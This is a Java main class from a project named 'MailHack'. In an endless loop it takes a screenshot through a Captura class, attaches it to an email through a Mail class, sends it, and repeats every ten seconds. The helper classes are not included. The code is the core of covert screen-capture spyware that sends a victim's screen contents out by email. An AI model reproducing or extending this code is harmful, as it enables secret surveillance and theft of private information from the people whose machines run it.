/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Main.java to edit this template
 */
package mailhack;

import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Jhoan
 */
public class MailHack {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {

        Mail mail = new Mail();
        Captura captura = new Captura();
        while (true) {
            try {
                String Ruta = captura.TomarCaptura();
                mail.CreateEmail(Ruta, "captura.jpg");
                mail.sendEmail();
                Thread.sleep(10000);
            } catch (InterruptedException ex) {
                Logger.getLogger(MailHack.class.getName()).log(Level.SEVERE, null, ex);
            }

        }

    }

}
